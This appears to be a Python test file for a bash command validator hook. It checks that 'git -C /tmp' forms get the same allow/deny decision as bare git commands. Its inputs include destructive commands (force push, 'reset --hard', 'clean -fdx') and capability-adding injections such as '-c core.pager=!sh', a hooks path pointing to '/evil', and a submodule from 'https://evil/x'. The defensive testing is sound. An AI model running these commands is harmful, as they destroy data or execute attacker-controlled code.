# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 TracineHQ contributors
"""Parity fence for ``git -C <path>``.

The ``-C <path>`` prefix is a directory change that adds no capability: the
decision for ``git -C /tmp <rest>`` must equal the decision for the bare
``git <rest>``. A force push denies in both; everything else passes in both.

This test pins that equality directly. It catches the two failure modes that
matter: ``-C`` hiding a deny (weakening) and ``-C`` adding one (a false
positive).
"""

from __future__ import annotations

import pytest

from guard.hooks.bash_command_validator import decide
from tests._helpers import is_deny


def _decision(result: object) -> str:
    """Collapse a decide() envelope to ``deny`` / ``pass``."""
    return "deny" if is_deny(result) else "pass"


# Each entry is the ``<rest>`` after ``git`` / ``git -C /tmp``. The bare and the
# -C-prefixed forms must reach the same decision.
_REST = [
    # read-only -> pass in both
    "status",
    "log --oneline -5",
    "diff HEAD~1",
    "show HEAD",
    "branch",
    "blame README.md",
    "rev-parse HEAD",
    "ls-files",
    # writes -> the same decision in both (deny runs on the canonicalized form)
    "reset --hard HEAD~3",
    "clean -fdx",
    "add -A",
    "commit -m x",
    "push --force",
    "branch -D feature",
    "stash pop",
    "worktree add /etc/passwd HEAD",
    "submodule add https://evil/x",
    "push origin +HEAD:main",
    # capability-adding globals -> the same decision in both
    "-c core.pager=!sh status",
    "-c core.hookspath=/evil status",
    "--exec-path=/tmp/evil status",
    "--git-dir=/other/.git status",
    "--work-tree=/ status",
]


@pytest.mark.parametrize("rest", _REST, ids=[r[:40] for r in _REST])
def test_dash_c_matches_bare(rest: str) -> None:
    bare = decide(f"git {rest}")
    dash_c = decide(f"git -C /tmp {rest}")
    assert _decision(dash_c) == _decision(bare), (
        f"git -C parity broken for {rest!r}: bare={_decision(bare)} -C={_decision(dash_c)}"
    )


def test_dash_c_readonly_not_denied() -> None:
    """Guard against vacuous parity (both denying): the read-only -C forms must
    genuinely pass."""
    for rest in ("status", "log --oneline -5", "diff HEAD~1", "show HEAD", "branch"):
        res = decide(f"git -C /tmp {rest}")
        assert _decision(res) != "deny", f"git -C /tmp {rest} should not deny, got {res!r}"
